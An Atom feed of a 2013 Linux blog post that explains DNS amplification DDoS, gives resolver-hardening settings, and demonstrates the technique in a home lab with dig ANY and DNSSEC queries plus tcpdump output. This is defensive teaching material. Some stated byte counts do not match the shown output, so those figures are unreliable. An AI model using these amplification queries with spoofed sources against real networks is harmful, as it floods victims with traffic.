<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">

  <title><![CDATA[Lin's linux blog]]></title>
  <link href="http://lin-credible.github.io/atom.xml" rel="self"/>
  <link href="http://lin-credible.github.io/"/>
  <updated>2013-05-10T14:08:26+08:00</updated>
  <id>http://lin-credible.github.io/</id>
  <author>
    <name><![CDATA[Taolinran]]></name>
    <email><![CDATA[linuxtaolinran@gmail.com]]></email>
  </author>
  <generator uri="http://octopress.org/">Octopress</generator>

  
  <entry>
    <title type="html"><![CDATA[DNS Amplification Attacks]]></title>
    <link href="http://lin-credible.github.io/blog/2013/05/09/dns-amplification-attacks/"/>
    <updated>2013-05-09T10:10:00+08:00</updated>
    <id>http://lin-credible.github.io/blog/2013/05/09/dns-amplification-attacks</id>
    <content type="html"><![CDATA[<p><img src="http://lin-credible.github.io/images/anonymous/anonymoushackers_a.jpg" alt="alt text" /><br /></p>

<h3>Systems Affected</h3>

<p>Domain Name System <strong><em>DNS</em></strong> servers</p>

<h3>Overview</h3>

<p>A Domain Name Server DNS Amplification attack is a popular form of Distributed Denial of Service DDoS that relies on the use of publically accessible open recursive DNS servers to overwhelm a victim system with DNS response traffic.</p>

<!-- more -->


<h3>Description</h3>

<p>A Domain Name Server <strong><em>DNS</em></strong> Amplification attack is a popular form of Distributed Denial of Service <strong><em>DDoS</em></strong> that relies on the use of
publically accessible open recursive DNS servers to overwhelm a victim system with DNS response traffic. The basic attack technique consists of an attacker sending a DNS name lookup request to an open recursive DNS server with the source address spoofed to be the victim&#8217;s address. When the DNS server sends the DNS record response, it is sent instead to the victim. Attackers will typically submit a request for as much zone information as possible to maximize the amplification effect. Because the size of the response is typically considerably larger than the request, the attacker is able to amplify the volume of traffic directed at the victim. By leveraging a botnet to perform additional spoofed DNS queries, an attacker can produce an overwhelming amount of traffic with little effort. Additionally, because the responses are legitimate data coming from valid servers, it is especially difficult to block these types of attacks.</p>

<p>While the attacks are difficult to prevent, network operators can implement several possible mitigation strategies. The primary element in the attack that is the focus of an effective long-term solution is the detection and elimination of open recursive DNS resolvers. These systems are typically legitimate DNS servers that have been improperly configured to respond to recursive queries on behalf of any system, rather than restricting recursive responses only to requests from local or authorized clients. By identifying these systems, an organization or network operator can reduce the number of potential resources that the attacker can employ in an attack.</p>

<h3>Impact</h3>

<p>A misconfigured Domain Name System <strong><em>DNS</em></strong> server can be exploited to participate in a Distributed Denial of Service <strong><em>DDoS</em></strong> attack.</p>

<h3>Solution</h3>

<h2>DETECTION</h2>

<p>Several organizations offer free, web-based scanning tools that will search a network for vulnerable open DNS resolvers.  These tools will scan entire network ranges and list the address of any identified open resolvers.</p>

<h3>Open DNS Resolver Project</h3>

<p><a href="http://openresolverproject.org">openresolverproject.org</a>
The Open DNS Resolver Project has compiled a list of DNS servers that are known to serve as globally accessible open resolvers.  The query interface allows network administrators to enter IP ranges in CIDR format <strong><em>1</em></strong> .</p>

<h3>The Measurement Factory</h3>

<p><a href="http://dns.measurement-factory.com">dns.measurement-factory.com</a>
Like the Open DNS Resolver Project, the Measurement Factory maintains a list of Internet accessible DNS servers and allows administrators to search for open recursive resolvers <strong><em>2</em></strong> .  In addition, the Measurement Factory offers a free tool to directly test an individual DNS resolver to determine if it allows open recursion.  This will allow an administrator to determine if configuration changes are necessary and verify that configuration changes have been effective <strong><em>3</em></strong> .  Finally, the site offers statistics showing the number of open resolvers detected on the various Autonomous System <strong><em>AS</em></strong> networks, sorted by the highest number found <strong><em>4</em></strong> .</p>

<p>DNSInspect
<a href="http://www.dnsinspect.com">www.dnsinspect.com</a>
Another freely available, web-based tool for testing DNS resolvers is DNSInspect.  This site is similar to The Measurement Factory&#8217;s ability to test a specific resolver for vulnerability, but offers the ability to test an entire DNS Zone for several other potential configuration and security issues <strong><em>5</em></strong> .</p>

<h4>Indicators</h4>

<p>In a typical recursive DNS query, a client sends a query request to a local DNS server requesting the resolution of a name or the reverse resolution of an IP address.  The DNS server performs the necessary queries on behalf of the client and returns a response packet with the requested information or an error .  The specification does not allow for unsolicited responses.  In a DNS amplification attack, the key indicator is a query response without a matching request.</p>

<h2>MITIGATION</h2>

<p>Unfortunately, due to the overwhelming traffic volume that can be produced by one of these attacks, there is often little that the victim can do to counter a large-scale DNS amplification-based distributed denial-of-service attack.  While the only effective means of eliminating this type of attack is to eliminate open recursive resolvers, this requires a large-scale effort by numerous parties.  According to the Open DNS Resolver Project, of the 27 million known DNS resolvers on the Internet, approximately <strong><em>25 million pose a significant threat</em></strong> of being used in an attack <strong><em>1</em></strong> .  However, several possible techniques are available to reduce the overall effectiveness of such attacks to the Internet community as a whole.  Where possible, configuration links have been provided to assist administrators with making the recommended changes.  The configuration information has been limited to BIND9 and Microsoft&#8217;s DNS Server, which are two widely deployed DNS servers.  If you are running a different DNS server, please see your vendor&#8217;s documentation for configuration details.</p>

<h3>Source IP Verification</h3>

<p>Because the DNS queries being sent by the attacker-controlled clients must have a source address spoofed to appear as the victim&#8217;s system, the first step to reducing the effectiveness of DNS amplification is for Internet Service Providers to deny any DNS traffic with spoofed addresses.  The Network Working Group of the Internet Engineering Task Force released a Best Current Practice document in May 2000 that describes how an Internet Service Provider can filter network traffic on their network to drop packets with source addresses not reachable via the actual packet&#8217;s path <strong><em>7</em></strong> . The changes recommended in this document would cause a routing device to test whether it is possible to reach the source address of the packet via the interface that transmitted the packet. If it is not possible, then the packet obviously has a spoofed source address. This configuration change would considerably reduce the potential for most current types of DDoS attacks.</p>

<h3>Disabling Recursion on Authoritative Name Servers</h3>

<p>Many of the DNS servers currently deployed on the Internet are exclusively intended to provide name resolution for a single domain.  These systems do not need to support resolution of other domains on behalf of a client, and therefore should be configured with recursion disabled.</p>

<h4>Bind9</h4>

<p>Add the following to the global options <strong><em>8</em></strong></p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
</pre></td><td class='code'><pre><code class=''><span class='line'> options {
</span><span class='line'>     allow-query-cache { none; };
</span><span class='line'>     recursion no;
</span><span class='line'> };</span></code></pre></td></tr></table></div></figure>


<h4>Microsoft DNS Server</h4>

<p>In the Microsoft DNS console tool <strong><em>9</em></strong></p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>Right-click the DNS server and click Properties.
</span><span class='line'>Click the Advanced tab.
</span><span class='line'>In Server options, select the "Disable recursion" check box, and then click OK.</span></code></pre></td></tr></table></div></figure>


<h3>Limiting Recursion to Authorized Clients</h3>

<p>For DNS servers that are deployed within an organization or ISP to support name queries on behalf of a client, the resolver should be configured to only allow queries on behalf of authorized clients.  These requests should typically only come from clients within the organization&#8217;s network address range.</p>

<h4>BIND9</h4>

<p>In the global options, add the following <strong><em>10</em></strong></p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
</pre></td><td class='code'><pre><code class=''><span class='line'> acl corpnets { 192.168.1.0/24; 192.168.2.0/24; };
</span><span class='line'> options {
</span><span class='line'>  allow-query { corpnets; };
</span><span class='line'>  allow-recursion { corpnets; };
</span><span class='line'> };</span></code></pre></td></tr></table></div></figure>


<h4>Microsoft DNS Server</h4>

<p>It is not currently possible to restrict recursive DNS requests to a specific client address range in Microsoft DNS Server.  The most effective means of approximating this functionality is to configure the internal DNS server to forward queries to an external DNS server and restrict DNS traffic in the firewall to restrict port 53 UDP traffic to the internal server and the external forwarder <strong><em>11</em></strong> .</p>

<h3>Rate Limiting Response of Recursive Name Servers</h3>

<p>There is currently an experimental feature available as a set of patches for BIND9 that allows an administrator to restrict the number of responses per second being sent from the name server <strong><em>12</em></strong> .  This is intended to reduce the effectiveness of DNS amplification attacks by reducing the volume of traffic coming from any single resolver.</p>

<h4>BIND9</h4>

<p>There are currently patches available for 9.8.latest and 9.9.latest to support RRL on UNIX systems. Red Hat has made updated packages available for Red Hat Enterprise Linux 6 to provide the necessary changes in advisory RHSA-2013:0550-1. On BIND9 implementation running the <strong><em>RRL patches</em></strong> , add the following lines to the options block of the authoritative views <strong><em>13</em></strong>:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
</pre></td><td class='code'><pre><code class=''><span class='line'> rate-limit {
</span><span class='line'>    responses-per-second 5;
</span><span class='line'>     window 5;
</span><span class='line'> };</span></code></pre></td></tr></table></div></figure>


<h4>Microsoft DNS Server</h4>

<p>This option is currently not available for Microsoft DNS Server.</p>

<h1>ut supra</h1>

<p><img src="http://lin-credible.github.io/images/us_cert.jpg" alt="alt text" /><br /></p>

<h1>My TEST</h1>

<h2>What can I do</h2>

<p>If you operate a DNS server, please check the settings.</p>

<h4>Recursive servers</h4>

<p>should be restricted to your enterprise or customer IP ranges to prevent abuse. Directions on securing BIND and Microsoft nameservers can be found on the <a href="http://www.team-cymru.org/Services/Resolvers/instructions.html">Team CYMRU Website</a></p>

<h4>Authoritative servers</h4>

<p>should not offer recursion, but can still be used in an attack. Configure your Authoritative DNS servers to use DNS RRL <a href="http://www.redbarn.org/dns/ratelimits">Response Rate
Limiting</a> Knot DNS and NLNetLabs NSD include this as a standard option now. BIND requires a patch.</p>

<h4>Prevent spoofing on your network</h4>

<p>Configure <strong><em>BCP38</em></strong> on all CPE and Datacenter equipment edges that have fixed IP ranges. This could be as simple as setting ip verify unicast source reachable_via rx on a router interface. Any staticly routed customer should receive this setting by default.</p>

<h2>Test Environment</h2>

<p><img src="http://lin-credible.github.io/images/dns_atack_environ.jpg" alt="alt text" /><br />
<a href="http://lin-credible.github.io/blog/2013/04/25/master-slash-slave-dns-server-base-on-tsig/">My Former Test</a><br />
So weak&#8230;</p>

<h2>Hands on</h2>

<h3>Atacks my nameservers</h3>

<p>The attacks can be divided into three types, repeating queries, varying queries and a distributed attack. All attacks require the ability to spoof IP address using UDP. Another requirement is that the response is larger than the request to create the amplication. This is often achieved by querying for ANY, DNSKEY, NS or RRSIG records.</p>

<h4>Repeating query attack</h4>

<p>A repeating query attack will request the same record <strong><em>set</em></strong> over and over again. Usually an ANY query is used. An ANY query returns all the records for a specic domain name regardless of the record type. When sent to a recursive server, the server will only return the records that it has cached. The server will have to reply, regardless of available recursion. This is currently the most common attack because the ANY requestusually returns a large collection of resource records, creating a high amplification ratio.</p>

<h5>Repeating query attack</h5>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>$ [root@_Client1&Attacker_192.168.10.78 ~]$dig @192.168.10.112 wordpress.wondershare.cn ANY +stats +dnssec | grep -i "size"
</span><span class='line'>$ ;; MSG SIZE  rcvd: 105</span></code></pre></td></tr></table></div></figure>


<h5>TCP dump output udp port 53</h5>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>$ 14:44:11.916691 IP attack.wondershare.cn.59829 &gt; master.wondershare.cn.domain: 42592+ [1au] ANY? wordpress.wondershare.cn. (53)
</span><span class='line'>$ 14:44:11.917935 IP master.wondershare.cn.domain &gt; attack.wondershare.cn.59829: 42592* 1/1/2 A 192.168.10.112 (105)</span></code></pre></td></tr></table></div></figure>


<p>From the example above notice that the request is 53 bytes and the response is 105 bytes. These attacks are usually easy to detect because the exact same queries are being re-used. This is uncommon behavior because the recursive DNS server is expected to cache the records. If ANY requests are blocked the attacker might switch to RRSIG, DNSKEY or any other query that generates a large response.</p>

<h4>Varying query attack</h4>

<p>When attackers notice that the attacks mentioned in section 2.1 are being mitigated they may have to switch to a more sophisticated attack. The varying query attack sends queries for varying domain names to the DNS server. By sending dieffrent unique requests the attacker tries to generate unique responses making the attack traffic less obvious and therefore harder to detect and counter. Even if the domain name cannot be resolved, an NXDOMAIN response is returned. An NXDOMAIN response is an error message indicating that domain name does not exist. When DNSSEC is congured the server also returns one or more NSEC <strong><em>3</em></strong> records which are used to prove that the requested domain name does not exist. Together with RRSIG signatures this generates a big amplification as well.</p>

<h5>Response_size_with_NSEC</h5>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>$ [root@_Client1&Attacker_192.168.10.78 ~]$dig @192.168.10.112 random20130509.wondershare.cn A +stats +dnssec | grep -i "size"
</span><span class='line'>$ ;; MSG SIZE  rcvd: 121</span></code></pre></td></tr></table></div></figure>


<h5>tcp dump output</h5>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>$ 14:45:02.814151 IP attack.wondershare.cn.44930 &gt; master.wondershare.cn.domain: 57333+ [1au] A? random20130509.wondershare.cn. (58)
</span><span class='line'>$ 14:45:02.815432 IP master.wondershare.cn.domain &gt; attack.wondershare.cn.44930: 57333 NXDomain* 0/1/1 (121)</span></code></pre></td></tr></table></div></figure>


<p>From the example above notice that the request is 63 bytes and the response is 1153 bytes. The response is as big as with the ANY request and it is also disturbing. When NSEC3 is used the amplification ratio is even larger.</p>

<h5>About NSEC3</h5>

<p>NSEC3 is an alternate version of <a href="https://www.dnssec-tools.org/wiki/index.php/NSEC">NSEC</a> proof of non-existence. A side effect of NSEC records is that a zone can be traversed from one end to the other and every record can be discovered. NSEC3, defined in
<a href="http://www.rfc-editor.org/rfc/rfc5155.txt">RFC5155</a> solves this by publishing only hash records of zone names.</p>

<h3>Distributed attacks</h3>

<p><img src="http://lin-credible.github.io/images/distributed_attacks.jpg" alt="alt text" /><br /></p>

<h3>Another test</h3>

<p>DNS queries are typically transmitted over UDP, meaning that, like ICMP queries used in a SMURF attack, they are fire and forget. As a result, their source attribute can be spoofed and the receiver has no way of determining its veracity before responding. DNS also is capable of generating a much larger response than query. For example, you can send the following <strong><em>tiny</em></strong> query <strong><em>where x.x.x.x is the IP of an open DNS resolver</em></strong> :</p>

<h5>Share</h5>

<p><img src="http://lin-credible.github.io/images/smurf_attack.jpg" alt="alt text" /><br /></p>

<h5>TEST AGAIN</h5>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
<span class='line-number'>37</span>
<span class='line-number'>38</span>
<span class='line-number'>39</span>
<span class='line-number'>40</span>
<span class='line-number'>41</span>
<span class='line-number'>42</span>
<span class='line-number'>43</span>
<span class='line-number'>44</span>
<span class='line-number'>45</span>
<span class='line-number'>46</span>
<span class='line-number'>47</span>
<span class='line-number'>48</span>
<span class='line-number'>49</span>
<span class='line-number'>50</span>
<span class='line-number'>51</span>
<span class='line-number'>52</span>
<span class='line-number'>53</span>
<span class='line-number'>54</span>
<span class='line-number'>55</span>
<span class='line-number'>56</span>
<span class='line-number'>57</span>
<span class='line-number'>58</span>
<span class='line-number'>59</span>
<span class='line-number'>60</span>
<span class='line-number'>61</span>
<span class='line-number'>62</span>
<span class='line-number'>63</span>
<span class='line-number'>64</span>
<span class='line-number'>65</span>
<span class='line-number'>66</span>
<span class='line-number'>67</span>
<span class='line-number'>68</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>$ [root@_Client1&Attacker_192.168.10.78 ~]$dig ANY isc.org @192.168.10.112
</span><span class='line'>$ ;; Truncated, retrying in TCP mode.
</span><span class='line'>$ 
</span><span class='line'>$ ; &lt;&lt;&gt;&gt; DiG 9.8.2rc1-RedHat-9.8.2-0.17.rc1.el6_4.4 &lt;&lt;&gt;&gt; ANY isc.org @192.168.10.112
</span><span class='line'>$ ;; global options: +cmd
</span><span class='line'>$ ;; Got answer:
</span><span class='line'>$ ;; -&gt;&gt;HEADER&lt;&lt;- opcode: QUERY, status: NOERROR, id: 48740
</span><span class='line'>$ ;; flags: qr rd ra; QUERY: 1, ANSWER: 30, AUTHORITY: 4, ADDITIONAL: 12
</span><span class='line'>$ 
</span><span class='line'>$ ;; QUESTION SECTION:
</span><span class='line'>$ ;isc.org.                       IN      ANY
</span><span class='line'>$ 
</span><span class='line'>$ ;; ANSWER SECTION:
</span><span class='line'>$ isc.org.                3666    IN      RRSIG   SPF 5 2 7200 20130607053707 20130508053707 50012 isc.org. LKkjm3NP/b5j/j/AIfmannf06RRnit0McdxSNVWVMJpPmaUfXb/+bHhD 0ZkKXtxhtkWEzD8D0EyeH0Nj6jUREXBOb7vwuC+gm3QnbQdyJmpMwyV3 gbteTrF3b6UhGKuFw1w46kq/5oFGpU5+zLGYn9Ft6nHYUbvptmeHR4Km /Bg=
</span><span class='line'>$ isc.org.                3666    IN      SPF     "v=spf1 a mx ip4:204.152.184.0/21 ip4:149.20.0.0/16 ip6:2001:04F8::0/32 ip6:2001:500:60::65/128 ~all"
</span><span class='line'>$ isc.org.                3666    IN      RRSIG   DNSKEY 5 2 7200 20130607050128 20130508050128 12892 isc.org. fmX1V30pjHEpGkTMI1qBq7baX2fTtNpcwpxalb/zZVRg2/e0vrm10lNP j064HvkNbUuHYgFymwBxPdhOJAW1Aukq3CBP2pKUmhlxX1N1O7m8Qw9o RXqmuo/yhRw0M3sjFmXWtsiJRDuHo3xAS3/7Lf3jqHCzUCA/6EWFzOdF KTZ3irYb5T5YCu69rIo7OAh9WT5Ak3eVFroV+7oXJQlE+2ptI1v+E6+j udzDg9jcDWL2bR6img3GlZZR2nnSBpbxU5thsfGPQw71njy2yco4lyEM HNSIjZufbrcgxairKTF5LiIWeRrg0JrhMOu0sR1RHv/UvoVpB9Qj9h9C k7ib/Q==
</span><span class='line'>$ isc.org.                3666    IN      RRSIG   DNSKEY 5 2 7200 20130607050128 20130508050128 50012 isc.org. jclOfqWm5aN7WKd4YrJJsAVbQIYcuBP/843lJAaAwEz3jkPYR2M2uBHs VXnN43r4uam0J4z40rXEKhQPGDWOj92g29a3ugABM3pcPm3N+POOcLry wL6zcKYjgvl0RBhuQdGrkkVr26Kie1aRClFlhafHJ5QRivbo/4pkfzw7 984=
</span><span class='line'>$ isc.org.                3666    IN      DNSKEY  257 3 5 BEAAAAOhHQDBrhQbtphgq2wQUpEQ5t4DtUHxoMVFu2hWLDMvoOMRXjGr hhCeFvAZih7yJHf8ZGfW6hd38hXG/xylYCO6Krpbdojwx8YMXLA5/kA+ u50WIL8ZR1R6KTbsYVMf/Qx5RiNbPClw+vT+U8eXEJmO20jIS1ULgqy3 47cBB1zMnnz/4LJpA0da9CbKj3A254T515sNIMcwsB8/2+2E63/zZrQz Bkj0BrN/9Bexjpiks3jRhZatEsXn3dTy47R09Uix5WcJt+xzqZ7+ysyL KOOedS39Z7SDmsn2eA0FKtQpwA6LXeG2w+jxmw3oA8lVUgEf/rzeC/bB yBNsO70aEFTd
</span><span class='line'>$ isc.org.                3666    IN      DNSKEY  256 3 5 BQEAAAABwuHz9Cem0BJ0JQTO7C/a3McR6hMaufljs1dfG/inaJpYv7vH XTrAOm/MeKp+/x6eT4QLru0KoZkvZJnqTI8JyaFTw2OM/ItBfh/hL2lm Cft2O7n3MfeqYtvjPnY7dWghYW4sVfH7VVEGm958o9nfi79532Qeklxh x8pXWdeAaRU=
</span><span class='line'>$ isc.org.                66      IN      RRSIG   NSEC 5 2 3600 20130607053707 20130508053707 50012 isc.org. ggAmIaJhbKT0AoknAPlJgv5dpgJXs/9dZvG27ruO0e/265wHC10vXRof j486MozpfcKAdjCxUE6Hvtddety4DKcKudH9kI3YPKIxOVXsnSFBW7Nb jt6fUuaHF/QQmiAHpAPyEOi5ewBVBQmn30Lxa/Vq4SP+Cc8xxWGm/6eZ hVc=
</span><span class='line'>$ isc.org.                66      IN      NSEC    _adsp._domainkey.isc.org. A NS SOA MX TXT AAAA NAPTR RRSIG NSEC DNSKEY SPF
</span><span class='line'>$ isc.org.                3666    IN      RRSIG   NAPTR 5 2 7200 20130607053707 20130508053707 50012 isc.org. t1FQjqnoaX7AIvKyHBSbW86iElt1ltqsu9mD5ntLIiPfmyKn7UtGTXNH W1Y9EA7MyyCjkh1gBUylu+RUBobqeHoHIrSYDmiyVF4xv9Nyw6Jt++ie xbPEQN1K2WEjEPlgSX8yHZXKPmQ38lr4KE18JqgpD59jAXfpmLNLNAgG C0I=
</span><span class='line'>$ isc.org.                3666    IN      NAPTR   20 0 "S" "SIP+D2U" "" _sip._udp.isc.org.
</span><span class='line'>$ isc.org.                3666    IN      RRSIG   AAAA 5 2 7200 20130607053707 20130508053707 50012 isc.org. B6F3efmr1pwkFC1fBy78dbD5Zjk+q6RYezFWloU5ncdmF3OjMlt0C/HN Ilzz5FwIeCJ/BIO3oCKK9lRLFZovHzF0gf0hmEPjZqUWSB6cOLhI4s/n 9R+LbQqP0clIx897PSdQzRhzCho0HhdD82DIZTJutljvXRWVEpaDmMOU Fn0=
</span><span class='line'>$ isc.org.                3666    IN      AAAA    2001:4f8:0:2::d
</span><span class='line'>$ isc.org.                3666    IN      RRSIG   TXT 5 2 7200 20130607053707 20130508053707 50012 isc.org. mrWC9EO13woVVMICI49/MfN9Jcrp4klwOKysVim4DWDADezbpvhvuBM5 Wwc3ghH6+WMGZ5CBPt/mqyVKjpmn2U+Qnrz7CPSB1cET1uuDHkYJD0A3 BRXLoiNewuSZELHVuMxpofpMxq33XZIL24T471Td+0fJZEmbJovess/o Vuk=
</span><span class='line'>$ isc.org.                3666    IN      TXT     "v=spf1 a mx ip4:204.152.184.0/21 ip4:149.20.0.0/16 ip6:2001:04F8::0/32 ip6:2001:500:60::65/128 ~all"
</span><span class='line'>$ isc.org.                3666    IN      TXT     "$Id: isc.org,v 1.1801 2013-05-08 00:18:57 plosher Exp $"
</span><span class='line'>$ isc.org.                3666    IN      RRSIG   MX 5 2 7200 20130607053707 20130508053707 50012 isc.org. s8XqhJ7tiZr+rjQiW0Vk5ecEM9AYn4K0u/VUsXR4cqmJTz8i1UE1is/C ZI54O8Co+HENgCZ9WJoOkG19FVhoieWoMLe3i/zNt5825/k4PZ4CeCV0 guNicMrM71fcCj0zlqNMWJMz/22NBQoKMonKg1gPmzl2mQ9mf+YpHt1R /pU=
</span><span class='line'>$ isc.org.                3666    IN      MX      10 mx.pao1.isc.org.
</span><span class='line'>$ isc.org.                3666    IN      MX      10 mx.ams1.isc.org.
</span><span class='line'>$ isc.org.                3666    IN      RRSIG   A 5 2 7200 20130607053707 20130508053707 50012 isc.org. qmKTEu6axRFlobhc3KEPmjz8AE81n1dzRPRVDwGwfkDRGtJ844nxDlu8 6Nv4GHHsCt4nnJQfFUjbnexeejOulPRT2AIfkHt4QA4EySF/EcNZ+ABd 4a6bHEpzxyjTJOFb5Vet39i77rI2OH27aDQhdnc0/LFm/zGJWyCfT21T P1Q=
</span><span class='line'>$ isc.org.                3666    IN      A       149.20.64.42
</span><span class='line'>$ isc.org.                3666    IN      RRSIG   NS 5 2 7200 20130607053707 20130508053707 50012 isc.org. WJkcxWdClQlyHiDH6kjlUAZcYNJoBhCuK7a9LNCN5d45SZfXsc5vgiBz R9MrVdfFy9KFAU7d4AUCMdxgKyFVYGhfCYzkCzDBPNGsQ8s9FtxilvPG X0NhHkVeyG7pEObTT3t2HBhw1Ma66p2RSLq1LuXGYm7NDAgQlsZ3q84j XVc=
</span><span class='line'>$ isc.org.                3666    IN      RRSIG   SOA 5 2 7200 20130607053707 20130508053707 50012 isc.org. S3wOp5HlTGP2jC3xGtnAgnzRrh77Oh0cxVAKwWKdce/08v5qQrp4uEiY 2CdITjoFJSp3Ae2BTYRo8s1m1SQFEWtG5F3c5yH0YmeNjcB2X0iq4l0L vMJx7UaPmlqjSPnqNIBfO6qz6HUDU42cmKSpHc4O14Iyznw4mGIGp4RM 9pY=
</span><span class='line'>$ isc.org.                3666    IN      SOA     ns-int.isc.org. hostmaster.isc.org. 2013050801 7200 3600 24796800 3600
</span><span class='line'>$ isc.org.                82865   IN      RRSIG   DS 7 2 86400 20130522155545 20130501145545 42353 org. FQUDUk8uYeurMJGihi+DxtQtPaoT7bFHgD89cNyv7UwgXBhh6SEUgF1h bJuxrQaYUNeM28UZcdfqui2CIU0nac1NPkZ/a1Lovfrd3wOQprv4A97T FqYLhpZnOHDo2rEhS/pgF+qf+dgJfrLAZX9BJSaIn/sP4luZtyd+Loi5 lS4=
</span><span class='line'>$ isc.org.                82865   IN      DS      12892 5 2 F1E184C0E1D615D20EB3C223ACED3B03C773DD952D5F0EB5C777586D E18DA6B5
</span><span class='line'>$ isc.org.                82865   IN      DS      12892 5 1 982113D08B4C6A1D9F6AEE1E2237AEF69F3F9759
</span><span class='line'>$ isc.org.                3666    IN      NS      ams.sns-pb.isc.org.
</span><span class='line'>$ isc.org.                3666    IN      NS      ns.isc.afilias-nst.info.
</span><span class='line'>$ isc.org.                3666    IN      NS      sfba.sns-pb.isc.org.
</span><span class='line'>$ isc.org.                3666    IN      NS      ord.sns-pb.isc.org.
</span><span class='line'>$ 
</span><span class='line'>$ ;; AUTHORITY SECTION:
</span><span class='line'>$ isc.org.                3666    IN      NS      sfba.sns-pb.isc.org.
</span><span class='line'>$ isc.org.                3666    IN      NS      ns.isc.afilias-nst.info.
</span><span class='line'>$ isc.org.                3666    IN      NS      ord.sns-pb.isc.org.
</span><span class='line'>$ isc.org.                3666    IN      NS      ams.sns-pb.isc.org.
</span><span class='line'>$ 
</span><span class='line'>$ ;; ADDITIONAL SECTION:
</span><span class='line'>$ mx.ams1.isc.org.        66      IN      A       199.6.1.65
</span><span class='line'>$ mx.ams1.isc.org.        66      IN      AAAA    2001:500:60::65
</span><span class='line'>$ mx.pao1.isc.org.        66      IN      A       149.20.64.53
</span><span class='line'>$ mx.pao1.isc.org.        66      IN      AAAA    2001:4f8:0:2::2b
</span><span class='line'>$ sfba.sns-pb.isc.org.    82865   IN      A       149.20.64.3
</span><span class='line'>$ sfba.sns-pb.isc.org.    82865   IN      AAAA    2001:4f8:0:2::19
</span><span class='line'>$ ams.sns-pb.isc.org.     82865   IN      A       199.6.1.30
</span><span class='line'>$ ams.sns-pb.isc.org.     82865   IN      AAAA    2001:500:60::30
</span><span class='line'>$ ns.isc.afilias-nst.info. 82867  IN      A       199.254.63.254
</span><span class='line'>$ ns.isc.afilias-nst.info. 82867  IN      AAAA    2001:500:2c::254
</span><span class='line'>$ ord.sns-pb.isc.org.     82865   IN      A       199.6.0.30
</span><span class='line'>$ ord.sns-pb.isc.org.     82865   IN      AAAA    2001:500:71::30
</span><span class='line'>$ 
</span><span class='line'>$ ;; Query time: 2 msec
</span><span class='line'>$ ;; SERVER: 192.168.10.112#53(192.168.10.112)
</span><span class='line'>$ ;; WHEN: Thu May  9 14:29:52 2013
</span><span class='line'>$ ;; MSG SIZE  rcvd: 3620</span></code></pre></td></tr></table></div></figure>


<h5>tcp_dump_output</h5>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>$ [root@_master_192.168.10.112  etc]$ tcpdump udp port 53
</span><span class='line'>$ tcpdump: verbose output suppressed, use -v or -vv for full protocol decode
</span><span class='line'>$ listening on eth0, link-type EN10MB (Ethernet), capture size 65535 bytes
</span><span class='line'>$ 14:40:59.357353 IP attack.wondershare.cn.34223 &gt; master.wondershare.cn.domain: 24623+ ANY? isc.org. (25)
</span><span class='line'>$ 14:40:59.358522 IP master.wondershare.cn.domain &gt; attack.wondershare.cn.34223: 24623| 2/0/0 RRSIG, SPF (304)
</span><span class='line'>$ [root@_master_192.168.10.112  etc]$ tcpdump tcp port 53
</span><span class='line'>$ tcpdump: verbose output suppressed, use -v or -vv for full protocol decode
</span><span class='line'>$ listening on eth0, link-type EN10MB (Ethernet), capture size 65535 bytes
